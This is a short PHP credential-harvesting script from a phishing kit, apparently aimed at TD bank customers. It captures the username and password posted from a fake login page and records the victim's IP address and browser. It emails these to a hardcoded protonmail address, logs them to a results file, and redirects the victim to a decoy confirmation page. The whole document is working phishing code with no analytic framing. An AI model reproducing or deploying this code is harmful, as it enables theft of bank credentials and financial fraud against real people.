<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------created by codex.v5--------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TD Results-----------------------\n";
$send = "world009@protonmail.com";
$subject = "TDResultz 1 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../TDResultz.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "accountConfirm.htm?product=7";

</script>
